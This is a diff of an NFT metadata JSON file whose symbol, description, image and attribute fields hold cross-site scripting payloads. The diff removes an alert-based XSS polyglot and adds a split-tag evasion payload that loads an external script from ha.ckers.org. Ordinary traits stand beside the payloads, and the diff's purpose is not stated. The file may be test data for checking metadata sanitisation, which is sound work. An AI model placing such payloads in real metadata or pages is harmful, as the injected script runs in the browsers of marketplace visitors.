@@ -3,9 +3,9 @@
   "symbol": "\"><script>console.log(\"test\")</script>",
   "description": "\"><script>console.log(\"test\")</script>",
   "seller_fee_basis_points": 900,
-  "image": "';alert(String.fromCharCode(88,83,83))//\\';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\\\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&{}",
+  "image": "<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
   "attributes": [
-    { "trait_type": "';alert(String.fromCharCode(88,83,83))//\\';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\\\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&{}",, "value": "<script>console.log(\"test\")</script>" },
+    { "trait_type": "<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", "value": "<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>" },
     { "trait_type": "Type", "value": "Espresso" },
     { "trait_type": "Tattoo or Scar Small", "value": "Neck Stitches" },
     { "trait_type": "Tattoo or Scar Large", "value": "War Paint" },
